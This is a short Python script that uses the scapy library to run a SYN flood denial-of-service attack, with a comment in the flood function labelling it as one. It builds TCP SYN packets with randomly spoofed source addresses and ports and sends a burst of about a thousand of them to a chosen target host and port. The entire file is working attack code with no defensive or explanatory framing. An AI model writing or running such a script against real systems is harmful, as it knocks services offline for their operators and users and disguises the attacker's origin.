from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send
import socket, random, sys

def sendSYN(target, port):
    # creating packet
    # insert IP header fields
    tcp = TCP()
    ip = IP()
    #set source IP
    ip.src = "%i.%i.%i.%i" % (random.randint(1,254),
                              random.randint(1,254),
                              random.randint(1,254),
                              random.randint(1,254))
    ip.dst = target
    # insert TCP header fields
    tcp = TCP()
    #set source port as random valid port
    tcp.sport = random.randint(1,65535)
    tcp.dport = port
    #set SYN flag
    tcp.flags = 'S'
    send(ip/tcp)
    return


def sf(target, port):
    # SYNFlood attack
    print(f"Launch SYN FLOOD attack at {target}:{port} with SYN packets.")

    count = 0

    while count <= 1000:
        sendSYN(target, port)
        count += 1
        print(f"Total packets sent: {count}")
        print("==========================================")
